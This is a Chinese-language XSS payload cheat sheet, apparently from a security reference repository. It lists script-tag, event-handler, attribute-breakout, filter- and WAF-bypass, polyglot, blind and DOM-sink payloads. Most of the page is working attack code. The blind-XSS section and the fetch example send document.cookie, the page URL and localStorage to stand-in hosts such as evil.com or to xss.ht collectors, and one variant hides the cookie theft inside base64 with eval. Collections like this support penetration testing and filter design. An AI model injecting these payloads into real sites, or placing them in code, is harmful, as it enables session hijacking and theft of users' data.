<a id="-xss-payloads-collection"></a>
# 💉 XSS（跨站脚本）载荷合集

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./XSS.tr.md) • [🇬🇷 Ελληνικά](./XSS.el.md)

```
  ██╗  ██╗███████╗███████╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ╚██╗██╔╝██╔════╝██╔════╝    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
   ╚███╔╝ ███████╗███████╗    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
   ██╔██╗ ╚════██║╚════██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ██╔╝ ██╗███████║███████║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

---

<a id="-table-of-contents"></a>
## 📋 目录

- [基本载荷](#-basic-payloads)
- [事件处理器载荷](#-event-handler-payloads)
- [属性注入](#-attribute-injection)
- [JavaScript 上下文](#-javascript-context)
- [过滤绕过](#-filter-bypass)
- [Web 应用防火墙（WAF）绕过](#-waf-bypass)
- [多上下文通用载荷](#-polyglot-payloads)
- [盲 XSS](#-blind-xss)
- [DOM XSS](#-dom-xss)

---

<a id="-basic-payloads"></a>
## 🔴 基本载荷

<a id="classic-script-tags"></a>
### 经典 script 标签

```html
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<script>confirm('XSS')</script>
<script>prompt('XSS')</script>
<script>console.log('XSS')</script>
```

<a id="self-closing-tags"></a>
### 自闭合标签

```html
<script src="https://evil.com/xss.js"/>
<script src=//evil.com/xss.js></script>
<script/src="https://evil.com/xss.js"></script>
```

<a id="external-script"></a>
### 外部脚本

```html
<script src="https://evil.com/xss.js"></script>
<script src="data:text/javascript,alert(1)"></script>
<script src="data:,alert(1)"></script>
```

---

<a id="-event-handler-payloads"></a>
## ⚡ 事件处理器载荷

<a id="image-events"></a>
### 图像事件

```html
<img src=x onerror=alert('XSS')>
<img src=x onerror="alert('XSS')">
<img/src=x onerror=alert('XSS')>
<img src="x" onerror="alert(1)">
<img src=1 onerror=alert(1)>
<img src=/ onerror=alert(1)>
<img src="javascript:alert(1)">
<img onload=alert('XSS') src="valid.jpg">
```

<a id="svg-events"></a>
### SVG 事件

```html
<svg onload=alert('XSS')>
<svg/onload=alert('XSS')>
<svg onload="alert('XSS')">
<svg><script>alert(1)</script></svg>
<svg><script>alert&#40;1&#41;</script></svg>
```

<a id="body-events"></a>
### body 事件

```html
<body onload=alert('XSS')>
<body onpageshow=alert('XSS')>
<body onfocus=alert('XSS')>
<body onhashchange=alert('XSS')>
<body onscroll=alert('XSS')>
```

<a id="input-events"></a>
### 输入事件

```html
<input onfocus=alert('XSS') autofocus>
<input onblur=alert('XSS') autofocus><input autofocus>
<input type="image" src=x onerror=alert('XSS')>
<input type="text" onfocus="alert('XSS')" autofocus>
```

<a id="other-event-handlers"></a>
### 其他事件处理器

```html
<marquee onstart=alert('XSS')>
<video src=x onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
<details open ontoggle=alert('XSS')>
<iframe onload=alert('XSS')>
<object data=javascript:alert('XSS')>
<embed src=javascript:alert('XSS')>
<a onmouseover=alert('XSS')>click me</a>
<div onmouseover=alert('XSS')>hover me</div>
<form onsubmit=alert('XSS')><input type=submit>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
```

---

<a id="-attribute-injection"></a>
## 🔗 属性注入

<a id="breaking-out-of-attributes"></a>
### 逃逸出属性值

```html
"><script>alert('XSS')</script>
"><img src=x onerror=alert('XSS')>
'><script>alert('XSS')</script>
'><img src=x onerror=alert('XSS')>
"><svg onload=alert('XSS')>
" onmouseover="alert('XSS')
' onmouseover='alert(1)'
" onfocus="alert('XSS')" autofocus "
```

<a id="event-in-attributes"></a>
### 属性中的事件

```html
" onclick=alert('XSS') "
" onmouseover=alert('XSS') "
" onfocus=alert('XSS') autofocus "
" onload=alert('XSS') "
```

<a id="style-attribute-old-browsers"></a>
### style 属性（旧版浏览器）

```html
<div style="background:url(javascript:alert('XSS'))">
<div style="width:expression(alert('XSS'))">
```

---

<a id="-javascript-context"></a>
## 📜 JavaScript 上下文

<a id="breaking-out-of-javascript"></a>
### 逃逸出 JavaScript 上下文

```javascript
';alert('XSS');//
";alert('XSS');//
</script><script>alert('XSS')</script>
'-alert('XSS')-'
"-alert('XSS')-"
\';alert(1)//
\";alert(1)//
```

<a id="template-literals"></a>
### 模板字面量

```javascript
${alert('XSS')}
`${alert(1)}`
${alert`XSS`}
```

<a id="inside-json"></a>
### JSON 内部

```json
{"name":"test","value":"</script><script>alert(1)</script>"}
```

---

<a id="-filter-bypass"></a>
## 🔓 过滤绕过

<a id="case-variation"></a>
### 大小写变换

```html
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>
<scRIPT>alert('XSS')</scRIPT>
<IMG SRC=x OnErRoR=alert('XSS')>
```

<a id="tag-breaking"></a>
### 拆分标签

```html
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<sc\x00ript>alert('XSS')</sc\x00ript>
<scr\x09ipt>alert('XSS')</scr\x09ipt>
```

<a id="encoding---html-entities"></a>
### 编码：HTML 实体

```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">click</a>
```

<a id="url-encoding"></a>
### URL 编码

```html
<img src=x onerror=%61%6c%65%72%74%28%31%29>
<a href="javascript:%61%6c%65%72%74%28%31%29">click</a>
```

<a id="unicode-encoding"></a>
### Unicode 编码

```html
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
<script>eval('\u0061\u006c\u0065\u0072\u0074(1)')</script>
```

<a id="null-byte-injection"></a>
### 空字节注入

```html
<scr\x00ipt>alert('XSS')</scr\x00ipt>
<img src=x onerror=alert('XSS')\x00>
```

<a id="whitespace-bypass"></a>
### 空白字符过滤绕过

```html
<img/src=x/onerror=alert('XSS')>
<img\nsrc=x\nonerror=alert('XSS')>
<img\tsrc=x\tonerror=alert('XSS')>
<img src=x	onerror=alert('XSS')>
```

<a id="without-parentheses"></a>
### 不使用圆括号

```html
<script>alert`XSS`</script>
<script>onerror=alert;throw'XSS'</script>
<img src=x onerror=alert`1`>
<img src=x onerror="window['alert'](1)">
```

<a id="without-quotes"></a>
### 不使用引号

```html
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=alert(1)>
<img src=x onerror=alert(/XSS/)>
```

---

<a id="-waf-bypass"></a>
## 🛡️ Web 应用防火墙（WAF）绕过

<a id="double-encoding"></a>
### 双重编码

```html
%253Cscript%253Ealert(1)%253C/script%253E
%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E
```

<a id="using-comments"></a>
### 使用注释

```html
<script>/**/alert('XSS')/**/</script>
<img src=x onerror=/**/alert(1)/**//>
<!--<script>-->alert(1)<!--</script>-->
```

<a id="line-breaks"></a>
### 换行

```html
<script>
alert('XSS')
</script>

<img src=x
onerror
=
alert(1)>
```

<a id="alternative-tags"></a>
### 替代标签

```html
<math><mi//xlink:href="data:x,<script>alert(1)</script>">
<math><maction xlink:href="javascript:alert(1)">click
<isindex action="javascript:alert(1)" type=submit value=click>
```

<a id="svg-based-bypass"></a>
### 基于 SVG 的绕过

```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributename=x dur=1s>
<svg/onload=alert(1)>
```

<a id="using-eval"></a>
### 使用 `eval`

```html
<script>eval(atob('YWxlcnQoMSk='))</script>
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```

<a id="using-settimeoutsetinterval"></a>
### 使用 `setTimeout`/`setInterval`

```html
<script>setTimeout('alert(1)',0)</script>
<script>setInterval('alert(1)',0)</script>
<img src=x onerror=setTimeout('alert(1)')>
```

<a id="using-fetch"></a>
### 使用 `fetch`

```html
<script>fetch('https://evil.com/'+document.cookie)</script>
```

---

<a id="-polyglot-payloads"></a>
## 🎭 多上下文通用载荷

<a id="universal-xss-polyglots"></a>
### 通用多上下文 XSS 载荷

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23telecomhallx27telecomhall;)>'">

"><img src=x onerror=alert(1)//>'\"><img src=x onerror=alert(1)//><img src=x onerror=alert(1)//>'\"

javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

<a id="short-polyglot"></a>
### 简短的多上下文载荷

```html
'"><script>alert(1)</script>
'"><img src=x onerror=alert(1)>
```

---

<a id="-blind-xss"></a>
## 👁️ 盲 XSS

<a id="cookie-stealer"></a>
### Cookie 窃取

```html
<script>new Image().src="https://evil.com/steal?c="+document.cookie</script>
<script>fetch('https://evil.com/'+document.cookie)</script>
<img src=x onerror="this.src='https://evil.com/?c='+document.cookie">
```

<a id="data-exfiltration"></a>
### 数据外传

```html
<script>
var i=new Image();
i.src="https://evil.com/?cookie="+document.cookie+"&url="+document.URL;
</script>

<script>
fetch('https://evil.com/collect',{
    method:'POST',
    body:JSON.stringify({
        cookie:document.cookie,
        url:location.href,
        localStorage:JSON.stringify(localStorage)
    })
})
</script>
```

<a id="xss-hunter-payloads"></a>
### XSS Hunter 载荷

```html
"><script src=https://xss.ht></script>
"><img src=x onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8veHNzLmh0Lz9jPScrZG9jdW1lbnQuY29va2ll'))">
```

<a id="blind-xss-for-forms"></a>
### 针对表单的盲 XSS

```html
"><script src="https://your.xss.ht"></script>
test@test.com"><script src="https://your.xss.ht"></script>
{{constructor.constructor('fetch("https://your.xss.ht?c="+document.cookie)')()}}
```

---

<a id="-dom-xss"></a>
## 🌐 DOM XSS

<a id="source-based-dom-xss"></a>
### 按输入来源划分的 DOM XSS

```javascript
// URL 片段
https://example.com#<script>alert(1)</script>

// URL 参数
https://example.com?name=<script>alert(1)</script>

// document.referrer
Referer: <script>alert(1)</script>
```

<a id="common-sinks"></a>
### 常见危险接收点（sink）

```javascript
// innerHTML
document.getElementById('x').innerHTML = userInput;
// 载荷：<img src=x onerror=alert(1)>

// document.write
document.write(userInput);
// 载荷：<script>alert(1)</script>

// eval
eval(userInput);
// 载荷：alert(1)

// location
location = userInput;
location.href = userInput;
// 载荷：javascript:alert(1)
```

<a id="jquery-sinks"></a>
### jQuery 危险接收点（sink）

```javascript
// $().html()
$('#x').html(userInput);
// 载荷：<img src=x onerror=alert(1)>

// $()
$(userInput);
// 载荷：<img src=x onerror=alert(1)>

// $.parseHTML()
$.parseHTML(userInput);
// 载荷：<img src=x onerror=alert(1)>
```

<a id="angular-payloads"></a>
### Angular 载荷

```html
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
```

---

<a id="-quick-reference-by-context"></a>
## 📊 按上下文分类的速查

<a id="html-context"></a>
### HTML 上下文
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

<a id="attribute-context"></a>
### 属性上下文
```html
" onmouseover="alert(1)
"><script>alert(1)</script>
' onfocus='alert(1)' autofocus='
```

<a id="javascript-string-context"></a>
### JavaScript 字符串上下文
```javascript
';alert(1)//
"-alert(1)-"
</script><script>alert(1)</script>
```

<a id="url-context"></a>
### URL 上下文
```html
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

---

<a id="-resources"></a>
## 📚 参考资料

- [PortSwigger XSS 速查表](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP XSS 过滤绕过](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

---

<p align="center">
  <b>💉 XSS 载荷库</b><br>
  <i>仅供学习使用！</i>
</p>

> 译注：载荷依赖输出上下文、浏览器版本、解码步骤与 CSP；旧浏览器 CSS expression、某些标签和编码写法不适用于现代环境。根据 [MDN Set-Cookie 文档](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie#httponly)，HttpOnly Cookie 不能通过 document.cookie 读取；这不意味着 XSS 无法以当前会话发起操作。$.parseHTML() 本身返回节点，是否触发执行还取决于后续插入方式。原文示例保持原样。
